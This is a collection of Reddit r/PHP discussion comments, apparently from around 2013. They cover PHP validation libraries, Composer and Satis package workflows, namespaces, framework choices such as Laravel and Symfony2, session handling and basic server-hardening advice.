I didn't say I had a problem with validating arrays. Rather I said that using arrays for configuration is messy. E.g you have: 'title' =&gt; 'required | maxlength(max=10).... There is some parsing involved etc. I ran into problems when I tried to add conditional rules: e.g. rules that would only be applied if other rules were valid. This was also an array parameter which had nested parameters and led to some messy code. Now that I rewrote it using chaining, its much easier to use, e.g: $validate-&gt;field('height') -&gt;rule('between',7,10); -&gt;condition('type') -&gt;rule('filled') -&gt;rule('equals','fairy') -&gt;error("Some message")
&gt; There’s a lot of emotion and drama associated with benchmarking. The subjects that come in “first place” too often point to it as SCIENCE PROVES WE ARE BEST and the subjects that come in “last place” respond with variations of THIS IS STUPID AND PROVES NOTHING. &gt; &gt; ... &gt; &gt; Leaving the elements of drama aside, benchmarking properly is difficult and time-consuming work. For my own limited benchmarks, it took three days or more to properly update, test, run, fix, and re-run to perform them well, even with automated scripts to do the setup and analysis. And that was for the most basic bare bones “hello world” that benchmarks only the dynamic dispatch cycle (bootstrap, front controller, page controller, action method, and view rendering). &gt; &gt; Enter the guys at TechEmpower. &gt; &gt; They’re doing a series of regular benchmarks that includes not just a double-handful of PHP frameworks, but 90 frameworks/languages/foundations across several languages. They do the basic “hello world” bench in addition to a few others, such as ORM/database speed. They appear to share an approach similar to the one I first published in Nov 2006 and improved with the help of Clay Loveless in Jan 2007. The TechEmpower motivations appear to the be similar to mine as well. They have equalled and then exceeded the efforts that I’ve been able to put forth on my own. From what I can tell it’s really good work. &gt; &gt; With that, I am happy to say that I will be retiring my benchmarking project in favor of the TechEmpower one. Until futher notice, I’ll be combining my efforts (such as they may be) with the TechEmpower folks.
Hi Kristopher! I speed read though the example and it looks very promising. What seams to be missing is a straight forward structure (I appreciate it's a very early version). * Should "Coupling" be a sub-chapter of Interfaces and Dependency Injection? Can you decouple your components only with DI and Interfaces? * You have 2 design patters: DI and Adapter. One has a sub-chapter while the other is a dedicated chapter. Wouldn’t be better to put them under “Design Patterns” on the same level? * You start talking about design patters without a good explanation what the design patterns are * What is the bad architecture anyway? Remember that people don’t know what they don’t know. Give different examples of a bad architecture and categorise them. I know many developer who produce horrible code and are convinced it’s up to the latest standards ;-) * Why should I even care about the architecture? Good architecture comes with a cost (time, knowledge, planning, refactoring) and maintaining it is a constant process. When do you need it and what are costs of not having it. Educating developers might not be enough. Even if they know what is the best way they might need to give a solid business justification to their managers. In my experience, they seldom know how to do it. * I appreciate your sense of humour but I would avoid sentences like "Interfaces are absolutely great”. It’s a very subjective thing to say and it’s difficult to defend it. I know you’ve just started but think about architecture of your book ;-) The content is there and you clearly have a lot to say on the subject but don’t let your readers to feel lost. This subject is like a mine field. Walk carefully. I wish you good luck! ps. If you need a beta tester feel free to e-mail me ;-)
Oh, I've initially started the library with the idea to allow for conditional rules but I've changed my mind because I want this to be a base for a form library which should allow for client-side validation (think jquery validation). Converting server-side validation rules that are conditional to client side rules is messy. Since the individual validators (that validate single values) are context aware it would be easier to create a new class for the validation rule and match it with a client-side validation rule. Now, the rules are defined using arrays but they are converted into "rules" objects. Because I only need 4 ingredients to create a rule (name, options, error message, label) I don't think I need to construct the rules but only to pass the parameters to the factory in charge of that.
I think we came to the same solutions regarding some of the problems (eg: the need for a label in order to reuse error messages in case you need translatable messages). 1.Your library is not chainable ($v-&gt;rule() returns a rule, not $v so you cannot immediately add a new rule) 2.I think that it is more frequent to know ALL the rules that apply to a field (ie: set multiple rules at once) than know ALL the fields that have a rule (ie: set multiple fields to a rule). $v-&gt;rule('required', array('name', 'email')); I never think like that when I have a form to validate.
Pull requests accepted.
I have never thought of clientside validation from the validator library. Does your code do this by default? I think it would be a huge bonus to a validation library.
I don't see any problem with passing validation rules to the client side with my mwthod. Baiscally you could serialize it to whatever format you want and send it to the client. 
You got the gist of it. Unless you're securing a bank portal or something of equal importance, it should be fine. Maybe abstract it a bit so you can use different session adapters when the need/opportunity presents itself, but all in all this is good enough.
Check out #cleancode channel on IRC (freenode) also this link: http://ikke.info/clean_code.html
People always say this like it's somehow okay to publish bad code and expect other people to fix it. Open source isn't a "get-out-of-jail-free" card. You're still responsible for problems in the code you write.
Example: Mousetrap.bind("m i r r o r enter", function(e) { scale *= -1; $("html").css("-webkit-transform", "scaleX(" + scale + ")"); $("html").css("-moz-transform", "scaleX(" + scale + ")"); $("html").css("-o-transform", "scaleX(" + scale + ")"); $("html").css("-ms-transform", "scaleX(" + scale + ")"); $("html").css("transform", "scaleX(" + scale + ")"); }); Mousetrap library: http://craig.is/killing/mice
I'm not talking about passing some serialized data to the client but finding a flexible way of converting the server-side rules to javascript validators. Some JS validators use `data-` attributes to pass validation rules (eg: `data-validate-email`) or the rules are identifiable by a name which points to a function that does the validation. Plus I haven't found a client-side validation library that allows you to have conditional rules. Being lazy, I didn't want to have to create a client-side validation library as well. BTW, what client-side validation script you use and how do you convert the example above to something that scripts understands?
This is true, of course. Many people are incapable of writing well-architected code on their own. This is the genius of frameworks: that they allow inexperienced devs to turn out passably good code. But saying it's not possible to write good code because bad developers exist isn't germane to the question at hand.
what are you building your site on? if you are using wordpress you can do: &lt;?php if ( is_home() ) { // This is a homepage } else { // This is not a homepage } ?&gt;
yeah its wordpress. I'll try this!
I have to agree, fulltext in mysql has never worked too well and it's generally not worth giving up innodb to get when there are many other solutions capable of integrating with mysql which do a better job.
Thanks for the offer! I'll be sure to contact you soon for thoughts! :D
* add easter eggs: check * secure against malware: ehh...
One thing I would suggest is making the validator types constants, so the user doesn't have to remember the names of the validator types. In their IDE they will get a nice autocomplete on the class constant. For example: $validator-&gt;add('email_address', Validator::TYPE_EMAIL); 
I'm netbeans and sublime text. Phpstorm just doesn't cut it for me. (Yes I own a license)
From Wikipedia on the topic of namespaces: &gt; In computer programming, namespaces are typically employed for the purpose of grouping symbols and identifiers around a particular functionality So what it's providing is a way to group libs/code within an application and avoid clashes with other classes/interfaces/definitions which may employ the same names/identifiers. &gt; Namespacing provides a lot of useful context for developers, as well as making the autoloading of classes much easier This is a good one, prior to this (for myself at least) I would bake the namespace essentially into my class names via underscores - and a few other projects/autoloaders ran this convention as well, it works - but makes for excessively long class names - e.g. Vendorname_LibName_AwesomeClass() would load at /lib/Vendorname/LibName/AwesomeClass.php. &gt; If its use is a functional decision, what sort of impact would it have on clock cycles and server load? It would be so close to zero the advantages from a development/interoperability would far outweigh any overhead - autoloaders still receive the full class signature (including namespace) - so breaking this down into a file location for autoloading is trivial. E.g. as an example I put together a while ago to get my head around the PHP namespace syntaxes: https://github.com/magnetikonline/phpnsautoloader/blob/4b78bae5271c46c322a7b57432eb4932c5accc68/lib/bootstrap.php#L16 As you can see, on this highlighted line, I'm just flipping the namespace backslashes into forward slash directory path components - trivial.
So .. emm ... you are "teaching about MVC" before you cover the basics like DI and SRP. Why? MVC is architectural pattern which describes information flow between application layers. How can you start explaining any architectural pattern without giving any background on the subject? 
It's part of the PSR-0 autoloading standard. Check out getcomposer.org.
It's worth mentioning that your example is already implemented within SPL. See the top user comment: http://www.php.net/manual/en/function.spl-autoload-register.php
Namespaces are basically compiler-assisted class name prefixes (quoting here someone from PHP core team).
To be honest, I'd never used a validation library before using Laravel but it seems like it's lib does all of the things that yours does. And since the Laravel libs/components are modular, you could use it on any project. I think it's awesome that you put the work and effort into building your own, but I find that 90% of the time there's no point in re-inventing the wheel for common things such as this.
I've seen Composer. Haven't gotten around to actually using it yet, but I've wanted to poke around in Laravel for some time.
Wow, thanks for sharing that - was not aware. Just tested - worked a treat! And even uses my preferred file name convention of all lowercased paths/filenames - golden!
Nice analogy (why the downvote peeps?). 
I find that even in my own solo work sans 3rd party libs, going all namespaces is much, much nicer.
October 12, 2012? It's like you KNEW I would ask this question.
Composer really only seems useful for open-source projects. We just use submodules for everything. 
Yo dawg, I heard you liked developing projects while you develop projects so I put projects for you to develop inside your development projects... Jokes aside, you should be doing your dev in two separate locations: one for the main project, and one for the "vendor" subproject. If your subproject code won't work properly outside of the main project, then you have tight coupling and you should consider refactoring.
You're over thinking it, just git init inside your package directory in vendor and edit away like you already mentioned. Works great!
This is exactly how I do it. Because I'm pointing to dev-master, Composer checks out the git repository into vendor. Just make sure you commit all you changes before running a composer update.
1. The library absolutely [**is chainable**](https://github.com/vlucas/valitron/blob/master/src/Valitron/Validator.php#L626) and returns the main validator instance. Did you even look at the source code? 2. That is a different way of doing it for sure, but the fact is most forms have only a handful of fields that are required, so being able to define the validation rule applied to multiple fields is most often less typing and a faster way to do it. That being said, there is no reason Valitron can't support doing it both ways, so it is something I will consider.
Please avoid using URL shorteners on reddit. They give the spam filter a conniption. :)
You should only use session_regenerate_id() when user privileges are changed. Using it for every session makes little sense.
From this question I'm presuming you haven't written PHP very long. Pick up a book, read tutorials, follow PHP related blogs and look in to other peoples issues on Stack Overflow. That's the best advice I can give you instead of trying to have people show you how, it's far better to understand. So, here's your first read: [PHP: Sessions - Manual](http://www.php.net/manual/en/book.session.php)
Just in case somebody doesn't use composer. The composer file has instruction for autoload. 
Your presumption is correct. I just recently got into writing it about a month ago. Just finished up Larry Ullman's PHP for the Web, will definitely be looking into more of his material. Also, I keep forgetting there is a PHP manual online with a list of variables functions and so forth. Thanks for reminding me and pointing me to a function that will be of use!
Will do. Thanks for the suggestion.
Composer is one of those things with a very minimal barrier to entry whose benefits are very easily seen. A lot of things (like Namespacing in your case, for example) even when you "get" them you still find yourself thinking "yeah, but I'm not really sure why I'm bothering".
Like already stated, sessions is what you'll want to use if you're doing your own auth system. Not taking cookies into consideration, here's a very basic example: function checkSession() { if(isset($_SESSION['user'])) { return true; } else { return false; } } Then, to check authentication, just run: if(checkSession()) { // can post } else { //redirect } Again, a really basic example of how it would work. Not actual code that I would rely on, but it gives you an idea. You'll probably want to get comfortable with php more before trying to use existing libraries or frameworks, but authentication is a ton easier with a framework. It takes care of the heavy lifting and an auth system can be written in less than an hour.
1. Ok, I assumed the `rule()` returns something else because you can do `message()` afterwards. Not very intuitive, imo. 2. Even if you have a handful of fields that are required usually the line of thinking is "ok, what rules i need to set for the email address field?" and not "ok, which are the fields that must be valid email addresses?". In my case anyway.
Best of luck!
If you have multiple projects with private packages the ability to easily swap out a version of a package for another is quite powerful.
I'll take the licence if you're not using it :)
Laravel is really making a big impact. I really need to try it more extensively. At the moment, I cannot stop using Yii &amp; Kohana - I tend to get more jobs around these two, though. As a freelancer, I never really see many jobs for Laravel developers. Or am I just looking in the wrong place?
I won't create code for you that others have already demonstrated/directed you to, as it's answered now. I will say this though; If you're creating a social network, and you're letting users have a lot of input and especially allowing them to upload their own images, I'd take a look into security. The general rule is...NEVER trust your users. Assume that all of your users are there to attack you. So, just a little tip really. I urge you to look into PHP security and good practices. Good luck! :)
is this any good to you? http://getcomposer.org/doc/articles/handling-private-packages-with-satis.md 
You already linked the rather pointless article, we didn't need to see it twice.
Every command given to your systems by a user is absodefinitely a hack attempt. Always. 
As no one has yet brought this up, allow me to be the first: use a framework. In something like Laravel this is a problem so thoroughly solved it's a 15 minute tutorial from being implemented. And in a way that follows contemporary best practises, is testable and field-tested. Also, every other part of your application will be easier, faster, and gooder. Frameworks are your friend. Make sweet, sweet love to them. 
https://github.com/composer/satis
I don't understand why people complain about the backslash. The only argument I've heard is about it being used for escaping, but that's nonsense since escaping only happens in strings.
That is exactly what I'm looking for! My purpose is rather trivial for now (video game scheduling with my friends across the country)...but I figured what the hell I'd give it a whirl. Is it entirely hosted by you guys, or would I be able to host this on the pi? Thanks! 
Well, the first function I looked at ... isEmpty * why is a method that is meant to return a bool throwing an exception instead of returning false? * why doesn't `isEmpty` consider `false` to be an empty value? * why not just use PHP's `empty()` function which serves much the same purpose? If you have a use case where `empty()` has results that don't fit your need then have at it, but I imagine for most people it would be the better choice. Additionally, you can use `empty()` on a variable which doesn't exist without triggering a warning. And in the most recent version of PHP constructs like empty(trim($string)) now work properly. 
Some time ago I had to use eval inside an if expression. The operator being used came from the DB. The row would have the trigger value and the operator, these were compared against a value returned from the server being queried (things like trigger an alert if the CPU is above 60%). I'm still not sure if there was a nicer way to get around the problem which required no hardcoding and could be completely controlled from the DB.
isEmpty was created b/c empty() does not recognize whitespace as empty. You are correct though, As of PHP 5.5, this function is useless. empty(trim($string)) would replace it without the fear of exceptions or errors.
 $data = [ ['bill', 33], ['ted', 50] ]; array_walk($data, function($values,$index) { vprintf('%s is %d years old. ', $values); }); Although this requires a different source data format then your method. Could also return the generated strings with `vsprintf` rather than printing them as in this quickie example. I guess overall I'd say it seems your doing a lot of wheel reinvention without much added benefit. While the code itself seems readable and useable, I personally wouldn't see much benefit in it.
its a pain in the ass to use with a german keyboard layout, thats why I changed to US layout
If accessing private repos is your concern, you can actually specify the private repo containing your package as a VCS. Composer will use that VCS to pull any packages that match from your require sections. You don't even need satis or anything like that. http://getcomposer.org/doc/05-repositories.md#vcs { "repositories": [ { "type": "vcs", "url": "https://github.com/igorw/monolog" } ], "require": { "monolog/monolog": "dev-bugfix" } } This is really useful for situations where you might want to fork a package and send a pull request. You can specify your vcs repo (fork) of the package in your composer.json, and without changing your require sections composer will pull the package from your repo rather than the original source. Then you just keep it that way until your pull request gets merged, remove the VCS definition in composer.json and voila. EDIT: TL;DR - You don't have to host your packages on packagist or a satis server.
If it's site-centric controls, there's no reason not to put it in a configuration file. As @adawathan alluded to, this makes it possible and flexible enough to have different configurations for different environments. As it's not *really* relational information, it probably doesn't belong in the database (unless it's in a multi-tenant environment where they could change based on the "site"). Oh, and one other reminder - please in your documentation recommend that this configuration file is *outside* the document root so it can't be accessed directly if the person guesses the CMS and grabs the source. Even better, if it's a PHP array based configuration, have something that prevents direct access either though a web server setting/something in an .htaccess or a put a line at the top of the file that kicks back a header() with a 404.
If you have a few spare hours, read this book, it'll give you a great introduction to Laravel: https://leanpub.com/codebright
Personally, I'd move those ini settings out of the script if you can. It's just adding complexity to the solution without much gain. If you're going to hard-code some of these values in the script anyway, you might as well have them in the ini: - session.name - session.cookie_httponly - session.cookie_domain - session.cookie_path - session.cookie_domain Also, consider using session.use_strict_mode (PHP 5.5.2 and up) and session.cookie_lifetime as well.
Personally, I'd store it in the database but using a key-&gt;value store format rather than an individual column for each setting. In other words, with Eloquent, something like this... http://paste.laravel.com/1iUM EDIT: Worth mentioning you should ideally register and resolve something like the CmsConfig object in the IoC as a singleton so that when you need to use it it doesn't have to query the entire table every time. EDIT2: PS - There's also this... https://cartalyst.com/manual/composite-config
Oh, definitely - packages should never rely on its larger project. But in this case, the subproject is a standalone package for use within a framework (say, a service provider in Symfony), and I want to be able to both test and use it in the main project. If it's developed in a totally separate place, then you'd have to commit every change you make and run composer update to grab the latest version in order to test it within the context of the larger framework. Editing right in vendor means you don't have to do this.
Pretty easily the [Dynamic Return type plugin](https://github.com/pbyrne84/DynamicReturnTypePlugin/). I use the [Auryn Dependency Injector](https://github.com/rdlowrey/Auryn) to create objects with all of their dependencies injected directly. e.g. $imageController = $injector-&gt;make(ImageController::class); Using the dynamic return type plugin, PHPStorm will know that '$imageController' is of type 'ImageController' and will be able to suggest all of the functions available to an object of that type, as well as do code-inspection to pick up any obvious type errors. It makes life so easy - I can't imagine switching back to not using something like this. 
I'm glad they made the distinction between validating (::IS) and cleaning (::FIX). But overall, seems really verbose and unwieldy to me, based on their examples.
I thought it was "B A Select Start", no doubles.
Laravel does it automatically.
Just FYI, you're shadowbanned on reddit. I wouldn't ordinarily tell people that, but I think you may have been banned in error. You should contact the reddit admins if you feel it was done in error.
The right time to switch is probably when your team has the skills to use Symfony in a way that is more productive than what they can currently do with CI. I don't know your dev team but this could take a month or a year, maybe they already know it, I don't know. Just start doing some internal projects using Symfony2 and once your team is up to par in terms of skills, switch.
The right time is right now. 
This might help too: http://knpuniversity.com/screencast/php-namespaces-in-120-seconds
Two things: 1 Experiment on yourself first. Pick a project for this new framework that is not fulfilling a need for a client, but instead something that will be used by your company. For example, if there is a need for a small application to aid in project management or integrating with the company CRM... build that out in Symfony2 and get to know the framework first. You may find that you love it and you may not. 2 Keep that first project small. Make sure that it is a very small application with a very specific purpose so that you can make sure to understand as many intricacies of the framework and the third party code / plugins that you're going to use with it... Build a depth of knowledge while doing something very, very simple. For example... have a really solid understanding of how you're going to run your unit tests, conduct static code analysis, and any other tasks you might run with a continuous integration server. Also seek to set standards in how you're going to use the framework when turned out for client work... So that really mundane code is consistently written and does not differ based on who wrote it. After a small internal project you'll also have some rough numbers on how long certain things take. It may be your old methods of implementing authentication and access control took twice as long as it would take you in Symfony2... So your estimates for clients might go down as a result... or they might go up in other places...
That's actually VERY comprehensive. Love how it touches on core classes in namespaced classes. That would have thrown me off had I not known about it.
Namespaced items are referred to in strings all the time. Constantly. Like I've done it at least 50 times in the past hour. 
It sounds to me like your smaller project is pretty reliant on your larger one if you have to "test it within the context of the larger framework." Truly separate projects are fully testable in isolation (think Doctrine vs. Symfony), and work together by adhering to well-defined interfaces. Now, if the interfaces for your smaller project are still in flux, I wouldn't even bother separating the code at that point. I would develop both within the same project until the interface is pretty stable, and then split the projects. Editing out of vendor just seems... dirty. Though, admittedly, I can't think of any examples of problems it would cause.
Link?
sorry, included now.
Wow, I had no idea. I wonder what I did :-/ Thanks for letting me know!
Well sure, but then I could only review 1/3 of what has been written. I'm offering a much more in-depth analysis than what I'd do through a public forum like Reddit, and there's no sense in doing that with a partial product (personally I'd prefer an almost-finished product, but I'll work with what I'm given).
Once you have bitcoind installed on your server it will allow you to talk to it and execute commands. The documentation in here is really the biggest advantage to using this library
Jesus christ, get a job.
I tried to read the readme but there wasn't much in it. I was trying to figure out what exactly I could do with this library. Is it for mining bitcoins, or would I connect it to a shopping cart to accept btc as a payment? Also I'm trying to view it from a phone so I may just be missing something. 
You're not just switching frameworks, you're trying to get into a living, breathing framework instead of a dead one. And in that context, the time can never be soon enough. my two cents
Yii framework uses it. Most notably, it allows config items to contain logic and leverage PHP at the same time. And yes, it feels a bit dangerous while at the same time being incredibly convenient. Kindof like that old girlfriend I had in high school :)
&gt; I have been thinking when is a good time to change? Are you asking when is a good time to switch to a new set of tools or asking when is a good time to switch an existing project to a new framework? The former could be just about anytime you're ready, the latter is most likely never.
Yeah, it's intended for you not to know, so that people who are banned don't know to just create new accounts (say, if they're spamming). It sometimes goes awry, unfortunately.
If you are starting a greenfield project, just use your new framework instead (assuming of course you are confident you can pull it off within your agreed budget). For existing work you are probably stuck on CodeIgniter. Porting a legacy codebase over to an entirely new framework is a pain in the butt. It is possible, especially if the existing code is well written and you can pull it apart layer by layer but often older code is shitty code. Edit: in answer to your question, I swapped from CakePHP to laravel over a weekend. No problem whatsoever. On Friday I finished some CakePHP stuff, came back on Monday to work on a brand new project and built it with Laravel. The Cake stuff still exists but I am becoming less and less inclined to work on it.. it has become "maintenance only" code really. Switch went perfectly smoothly for me, but I have a great deal of control over what I write code in and how I work. 
An obvious one is to [contribute to the official PHP documentation](http://www.reddit.com/r/PHP/comments/l5hmq/interested_in_contributing_to_the_php_project_but/). :)
This is probably nothing that would interest you. The standard bitcoin wallet, bitcoin-qt has a command-line (text based) interface that allows you to execute commands like sending bitcoins. (As opposed to clicking the buttons in the gui.) This is a wrapper for that interface to make it easier for website developers that use php to connect to those bitcoin-qt servers.
Honestly, that sounds like you're Doing It Wrong.
I don't think so. It's very convenient when you're letting things indicate the objects they will work with.
Here's your competition: https://github.com/mikegogulski/bitcoin-php It hasn't been updated in 7 months, but neither has the bitcoind RPC protocol. So you might want to take a look at how Mike does things to see how your library stacks up. The biggest thing for me personally is the Unit Tests, so try to get some tests in there to make sure that everything still works as you make changes. 
Awesome thanks for the link will be improving shortly. 
I quit a full time job that used ZF1 and then ZF2 for years. After that, after trying CI, Cake, Fuel and Laravel, I settled for Phalcon as being the fastest. The right time is whenever you have actual time to sacrifice. If you don't, you should make some - there's always some timewastage you can trim and dedicate to learning new things.
https://openhatch.org/ lists 293 PHP projects. I've never tried it but it looks good.
So true, esp. since there are some security exploits that the framework never patched in its last revision. So, as long as you're on that moribund framework, you're vulnerable unless you want to rewrite the framework.
The usual way to lockdown a server (keeping it short and basic) 1. Turn off anything you don't need (or even better uninstall it) 2. Close ports you don't need (eg. MySQL can be accessed via localhost so use that instead of listening on a port, generally you would just leave 22, 80 and 443 open) 3. Install a firewall 4. Secure SSH (http://wiki.centos.org/HowTos/Network/SecuringSSH) 5. Secure the web server (Turn off modules you don't need etc) 6. Secure PHP (Turn off modules you don't need and follow this guide http://www.php.net/manual/en/security.php) 7. Use LONG passwords 8. Do not use root account (use sudo and lock this down as well) 9. Implement security policies (ssh can only connect from an ip range, minimum password length etc.) 10. Secure DNS if you have it There is a heap more you can do with locking a server down (setting up nids, ids etc.) but you need to find a balance with what you can do first then how much security you need to have. Most of this can be found through simple google searches or by looking at security/admin web sites (eg. OWASP). Hopefully I have given you enough fodder :)
I am also a self-learned sys-admin through few years of trial and error. Some tips I would give: - Linux server in their default setup are very secure. Its once you start installing services/severs that you start opening up channels for intrusion. So your main focus would be the services you installed (nginx/php/php-fpm/mysql) and configure them to be secure. - There is no 100% security, you can only minimize the attack vectors. Which is why backup is important, so when shit hits the fan you can actually have a good nights sleep. Setup auto hourly/daily/weekly backup. - firewall - chroot jail - file permissions - don't use admit GUI type thingies they often add their own sets of security vulnerability and then you will have to spend time securing them anyway. If you are interested you can look at [webmin](http://www.webmin.com/deb.html).
what does "shadowbanned" mean? I mean, I don't understand how you can be banned, but not know it
Made some changes - https://github.com/michaeljs1990/Bitcoin-PHP-API/network
Before updating a package that contains modifications, Composer warns you and can even stash the changes for you then pop them back on top after the update.
Different means, same end but I think composer is worth it. We use a private instance of Satis to "publish" our in-house packages. After that, you can easily maintain a project's dependencies with branch aliases or version tags instead of keeping track of commit hashes.
What's the advantage of this over any other bog-standard JSON RPC library? Looking at your source, it looks like it's literally just an extremely thin wrapper (almost all of it is `function x($a) { return $this-&gt;bitcoin-&gt;x($a); }`) over an existing JSON RPC library, which you didn't write yourself. The only real usefulness of your library to me seems to be for code completion if you're using an IDE.
That is currently what it is which for someone starting is a huge help (IMO). IT will be much more than that soon though as I will be implementing error reporting, version checking to make sure your client can run the proper functions and unit tests. I admit I'm not reinventing the wheel here but I would like to lower the entry level for developers as well as providing some hopefully fun to use tools.
Wow thank you! I am just looking over it now and it looks great! With i could give you more up-votes.
Great resource! Thanks!
I was fine with the examples, but I don't like having to add the manual "require" to create the validator instance.
Damnit Jim I'm a developer, not a sysadmin! Assuming this is an app and not just a pet project, my vote is stop what you're doing and sign up with a PaaS provider like Fort Rabbit or App fog or PagodaBox. There are so many other things you haven't even considered yet, scaling, disaster recovery, fault tolerance etc., etc.. The reality is that having you be sysadmin guy and setup servers and things adds risk and provides little or no value to the actual thing you are doing, the app. Edit: Also, this. http://www.reddit.com/r/PHP/comments/1nvmz1/what_is_the_benefit_of_using_a_paas_service_like/
What makes this different from the dozens of other similar libraries?
(I'm the author of the Aura.Filter library.) I totally get you on the manual "require" to create a filter instance. In theory, one should be building the filter object via service locator or dependency injection, as the RuleCollection/RuleLocator combination is moderately complex to set up each time. So the manual "require" is a "here's something to get you started" convenience, not much more. Perhaps adding a FilterFactory or something like that instead of the instance.php script would be more friendly.
Laravel uses an Active Record style ORM called Eloquent which is very easy to use. It also uses a templating system called Blade which is also great. And lastly, Laravel uses Symfony components where it makes sense. My vote is for Laravel. References: http://laravel.com/docs/eloquent http://laravel.com/docs/templates EDIT: After reading the comments I thought of another cool Laravel plus. It has the "Artisan" command console which let's you write a lot of infrastructure code without actually writing ANY code. In addition, Jeffery Way created some great generators that can be added in to really take it up a notch. If you are a sublime text user, there is a generators plugin to make it even easier. And finally, Laravel has migrations which is a godsend over many of the other frameworks I have used.
&gt;frameworks &gt;hipster web 3.0 components
&gt;I need to develop a feature rich website as quick as I can. &gt;I've used symfony2 before and found it OK If you need to do something quick - use the tools you already familiar with. 
if you have developed such a site before, just used what you used before when you want to be quick laravel currently is the "hippest" framework (for a good reason), if you want to learn something new, use laravel.
It looks like you picked some very old grammar (doesn't even support 5.3) as your base. And even then it seems hopelessly incomplete. E.g. it misses string interpolation, variable variables and a lot of the other very basic stuff.
I work .net for a living but still come home to hack Laravel for my freelance work and it's a dream.
Quite possibly. It's intended to support the basics of PHP at this point. It certainly does need to be brought up to date with PHP, and track PHP as it evolves. 
I really like using Laravel as well. Although I prefer Eloquent ORM instead of Redbean, nothing is stopping OP from using Redbean. You can install it via Composer (https://github.com/gabordemooij/redbean#install-with-composer) like all the other Laravel components available.
also just as a note, you don't have to use any template engine if you don't want to
the *"feature rich website"* part makes me balieve you will find a light framework better during the developement phase, BUT quickly find it very difficult to progress adding more and more features, and ultimately you can find yourself in hell trying to maintain your own app. A heavier framework like Symfony2 demands more time to learn but gives you exponentially more trust in your future hability to make your app grow and keep your code organized
Symfony 2.4 was released in december and the most important feature was the sensible simplification of the customization of main security features. It's a complex component; it did give me some trouble when learning
I know, I just prefer Twig over Blade, Blade is a little weird sometimes
Or just use a different browser (which you haven't logged into reddit with) :)
Don't build a blog, unless it's just a learning project and you're not actually going to use it in production. A better idea might be to use something like WordPress, and build a plugin and / or a theme for it.
Hey. I love you thinking! I have been using Silex, Redbean with Smarty for about 2-3 years now. I think its a fantastic pairing. I totally love how little code you can write to make a very functional site. 1. Silex has very little boiler plate required to configure the routes but has everything you will ever need for any tricky stuff you will need to do. 2. Redbean only needs 1 statement to connect to DB and fetching and storing data from your forms is a breeze with redbean "import" as a simple example. But has so many great features, from tagging, parent, child relationships, lazy loading etc. I just love it and have about 15-20 projects that use it. I love it because it's so darn simple and easy to read. Especially if you were to hand this project over to someone else, they could look at the code and just go "yip I get what you are doing here" 3. I use Smarty for templates, I found some examples that "said" it was quicker than Twig but I think you should stick to whatever you want here. As I think the argument is neither here or there. A lot of people love Laravel here. I think it would be really neat to try this out if you had the time. One thing I do love about Silex, Redbean, Smarty. Is that I can generally upgrade any one of the 3 and it wont break my sites. I feel like I am in control of the platform vs trying to get my platform to work. 
Or a different computer ;)
I'm not going to claim to be an authority on the topic, but from what I've learned reading online active record pattern is generally frowned upon (something regarding domain logic in data access layer). Could anybody who does know more than I do explain why this doesn't seem to be a common criticism of laravel whereas its a very common criticism of other frameworks (such as ruby on rails). Thank you :).
I agree the workflow for editing composer packages does seem to be lacking in documentation. I'm not sure why you think of the vendors as a "black box" that you should not edit though, in fact composer allows you to see all changed packages &amp; files with the command: composer status -v 
nope, qu'est-ce que c'est?
a web form with fields values that get written to and read from a JSON file is simple enough for this, or even just serializes the settings to a text file.
well, you're spot on in that my experience with Symfony2 is limited to heavily CRUD applications and I assumed 'feature rich' went sort of on that same path. OP should pay attention to your input
Personally, some of this is overkill - you will get much better mileage if you ensure that all HTTP communication is done over HTTPS.
Either when you (and your team) are familiar enough with Symfony2 so you can develop without much trouble or when CodeIgniter starts getting in the way with the development.
Nikita saying it's "hopelessly incomplete" should tell you that you are not supporting the basics, 5.2 release cycle which (if you're lucky) you appear to be using was started in 2006, it's very very behind. Second to the obvious shortcomings in the grammar, I have to question whether the intended purpose is really sane ... with all the effort you will have to put in to turn the mess that is every JSP page I ever saw into something like maintainable modern PHP, wouldn't you be better off just getting on with converting those sites by hand ? I think it would be useful to have the grammar, but not for this ...
do you really mean the "tracking" ? or just storing the results (sounds like an excel document)
wow, that's clever
What you are looking for is known as "A/B testing". It is quite common to track the variant used in the session and use something like statsd to increment counters on their performance (in terms of business metrics).
Not quite what i'm looking for. I'm looking for a way to effectively store the results of A/B testing in a way that the team can search for previous tests, and use the results to feed their A/B tests.
Cool, but how is this PHP related?
Interesting how Aura.Filter merges filtering and validation, pretty smart actually.
Composer hook.
Use elasticsearch. Set up a river from your db or index at the time of your database transaction. Don't write your own. Elasticsearch is stupid simple.
https://github.com/dflydev/dflydev-doctrine-orm-service-provider
Been meaning to try Elasticsearch. Does anyone know if a good PHP/Elasticsearch tutorial or screencast for Elasticsearch beginners?
Looking good, theory can be applied outside PHP too, though (but you do mention that in the article)
And not just Composer. There are also hooks for Doctrine and Sismo. All are tools used when developing php applications.
geez, 2 modals to close before you can look at the article. I closed the tab after that.. it's too spammy for me
I am very sorry about that I was just installing a new plugin and removing an old one.
Just using Solr definitely adds overhead, but solarium makes it rather approachable for a 'simple search'. Might not be worth it for OP's needs, but definitely worth checking out. Good recommendation.
http://www.elasticsearch.org/resources/
The modals are also not responsive, so page is not viewable on a phone screen. I just cannot close it. Imo this is not a real incentive to actually share the page. 
[this] (https://packagist.org/packages/nervetattoo/elasticsearch) is a pretty decent package if you don't want to build something yourself. Elasticsearch is json in, json out. So you could just use a good cURL lib if you wanted. 
You might want to do a benchmark first to see just how poor performance you have with this implementation compared to GMP or BcMath. Keep in mind that you can't really beat pure C implementation (which is the case with any extension) with any PHP code.
ugh... .inc files as php files
You mean for parsing the xml? This post is generally about gotchas when trying to use domdocument, so you can use xpath afterwards! The purpose of the craur library linked at the end of this post, is to parse xml which has a specific format. Parsing this with xpath for each property is slower then converting the xml document to an array in first place. If you want to try it out, you can checkout https://github.com/DracoBlue/Craur there is a xpath-test branch which I used to try this out. It performed bad :).
Back to the old plugin it is
Yes, this is terrible UX.
You misspelled Composer at " making the Comopser uptake better". Which might upset someone :) 
After using Symfony2 for the last year I decided to give Laravel a shot. IMO it's not even as close to as nice as Symfony2 w/Doctrine. Public static methods for everything? Namespacing not the default for generators and even examples in the documentation? Config nowhere near as nice as the yaml inheritance in Symfony2. PHPStorm support is non-existent. To me it's clear that Symfony2 is the top of the heap. When working with Silex I find it's easy to start spending time recreating parts of Symfony2 in Silex so unless it's just a simple one-off script or page I'd recommend just going with the default Symfony2 Framework.
